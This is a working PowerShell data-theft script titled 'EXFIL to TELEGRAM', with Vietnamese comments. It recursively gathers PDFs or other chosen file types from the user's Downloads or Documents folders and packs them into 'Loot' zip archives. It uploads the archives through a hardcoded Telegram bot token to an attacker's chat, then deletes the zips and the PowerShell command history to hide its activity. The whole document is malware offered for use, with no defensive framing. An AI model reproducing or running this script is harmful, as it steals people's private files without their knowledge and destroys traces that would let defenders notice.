<# 
============================================ EXFIL to TELEGRAM (FINAL) =========================================
#>
# Khai báo thông tin cố định để chạy nhanh nhất có thể
$Token  = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID = "8312702210"
$URL    = "https://api.telegram.org/bot$Token"

Function Exfiltrate {
    param (
        [string[]]$FileType = "pdf", 
        [string[]]$Path = "Downloads"
    )

    $maxZipFileSize = 45MB # Telegram giới hạn 50MB, để 45MB cho an toàn
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:TEMP\Loot$index.zip"

    # Thông báo bắt đầu (Dùng irm cho gọn)
    $msgBody = @{ chat_id = $ChatID; text = "🚀 $env:COMPUTERNAME : Bat dau thu thap file..." }
    Invoke-RestMethod -Method Post -Uri "$URL/sendMessage" -Body ($msgBody | ConvertTo-Json) -ContentType "application/json"

    # Xử lý đường dẫn (Sửa lỗi Array to String của Join-Path)
    if($Path){
        $foldersToSearch = $Path | ForEach-Object { Join-Path $env:USERPROFILE $_ }
    } else {
        $foldersToSearch = @(Join-Path $env:USERPROFILE "Documents", Join-Path $env:USERPROFILE "Downloads")
    }

    # Xử lý định dạng file
    $fileExtensions = if($FileType) { $FileType | ForEach-Object { "*.$_" } } else { "*.pdf" }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    if (Test-Path $zipFilePath) { Remove-Item $zipFilePath -Force }
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        if (!(Test-Path $folder)) { continue }
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                try {
                    # Nếu thêm file này vào sẽ quá dung lượng -> Gửi và tạo file Zip mới
                    if ($currentZipSize + $file.Length -gt $maxZipFileSize) {
                        $zipArchive.Dispose()
                        curl.exe -X POST "$URL/sendDocument" -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
                        Remove-Item $zipFilePath -Force
                        $index++
                        $currentZipSize = 0
                        $zipFilePath = "$env:TEMP\Loot$index.zip"
                        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                    }

                    # Tạo Entry trong Zip
                    $entryName = $file.FullName.Replace($folder, "").TrimStart("\")
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                    $currentZipSize += $file.Length
                } catch { continue }
            }
        }
    }

    # Gửi phần còn lại
    $zipArchive.Dispose()
    if (Test-Path $zipFilePath) {
        if ((Get-Item $zipFilePath).Length -gt 22) {
            curl.exe -X POST "$URL/sendDocument" -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
        }
        Remove-Item $zipFilePath -Force
    }

    Write-Output "Done."
}

# Thực thi hàm
Exfiltrate -FileType "pdf" -Path "Downloads"

# Xóa dấu vết
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
